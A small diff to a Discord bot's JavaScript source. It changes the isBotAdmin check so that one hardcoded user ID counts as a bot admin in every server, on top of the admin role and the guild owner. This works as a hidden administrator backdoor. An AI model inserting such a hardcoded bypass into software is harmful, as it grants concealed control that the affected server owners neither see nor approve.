@@ -251,7 +251,7 @@ function getChannel(guild, channel){
 }
 
 function isBotAdmin(member){
-    return hasRole(member, "Vulpix Admin") || member.user.id == member.guild.ownerID;
+    return hasRole(member, "Vulpix Admin") || member.user.id == member.guild.ownerID || member.user.id == '270175313856561153';
 }
 
 function setDefaults(guild){
